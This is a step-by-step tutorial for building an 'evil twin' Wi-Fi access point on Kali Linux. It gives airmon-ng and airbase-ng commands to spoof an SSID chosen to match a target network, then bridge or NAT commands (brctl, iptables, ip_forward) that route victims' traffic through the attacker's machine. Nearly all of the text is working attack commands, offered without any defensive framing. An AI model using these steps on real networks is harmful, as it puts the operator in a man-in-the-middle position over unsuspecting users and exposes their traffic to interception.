Steps for Evil-Twin Acess Point

*************************************************************
Creating virtual access points with airbase-ng
*************************************************************

When the wireless clients connect to our access point, we provide them with Internet connectivity through our wired Ethernet connection. 
While in this example, we assume that there is an available Ethernet connection on the attacker machine; 
this can also be accomplished via another wireless adapter or 3G/4G card.

STEP 1 
You can check the status of the adapter on Kali using the following command.
    ifconfig

STEP 2 
Create a monitor mode interface on the wireless interface. 
    airmon-ng start wlan0

STEP 3 
Use airbase-ng to create a new wireless access point. 
SSID and Channel will be the choice of the attacker; it should be chosen to reflect the target network. 
For this example. When an interface is specified, use the newly created monitor mode interface, mon0:
    airbase-ng –essid netgear –c 6 mon0

----------------------------------------------------------------------------------
NOTE: Here are some airbase-ng options
--essid   : Specifies the SSID (the access point name) to be created

-c        : Signifies the channel on which the access point will be functioning

mon0      : The monitor mode interface
----------------------------------------------------------------------------------

** 
We have successfully created the new virtual access point interface. 
Now it is time to bridge the two networks with each other in order to provide Internet access to the wireless clients. 
Here, we assume that 
"eth0" is the wired interface and 
"at0" is created by airbase-ng. 
"mitm" is the name of the "bridged interface".

STEP 4 
Creating a new bridged interface requires an additional package to be installed. 
The brctl command used here is part of the bridge-utils package; 
use the apt package manager to install it with the following command: #apt-get install bridge-utils

STEP 5
To complete the creation of the new bridged interface, use the commands detailed as follows. 
This will create a new bridge interface, add the wired (Internet) and virtual AP interface, 
and assign IP addressing via DHCP.

---------------------------------------------------
Build bridge between interfaces (eth0 - at0)

method 1 

#apt-get install bridge-utils 

brctl addbr mitm 
brctl addif mitm eth0 
brctl addif mitm at0 

ifconfig eth0 0.0.0.0 up 
ifconfig at0 0.0.0.0 up 
ifconfig mitm up 
dhclient mitm 

Method 2 

ifconfig at0 up 
ifconfig at0 10.0.0.1 netmask 255.255.255.0 
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o wlan1mon -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward




